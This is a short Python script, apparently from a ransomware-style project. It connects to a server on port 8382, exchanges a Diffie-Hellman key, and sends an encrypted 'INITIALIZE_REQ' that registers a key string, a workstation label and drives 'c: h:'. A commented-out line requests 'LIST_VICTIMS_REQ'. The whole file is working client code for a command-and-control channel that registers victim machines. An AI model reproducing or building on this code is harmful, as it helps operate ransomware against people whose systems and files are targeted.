import utile.network as net
import utile.message as mess
import utile.security as secu
socket, gp = net.connect_to_serv(port=8382)
data = mess.set_message('INITIALIZE_REQ', ['qsdkqkjhuqdsjkqsd','WORKSTATION','c: h:'])
key = secu.Diffie_Hellman_exchange_key(socket, gp)
data = secu.AES_GCM_encrypt(data, key)
net.send_message(socket, data)
print(secu.AES_GCM_decrypt(net.receive_message(socket), key))
"""socket, gp = net.connect_to_serv(port=8382)

net.send_message(socket, mess.set_message('LIST_VICTIMS_REQ'))"""
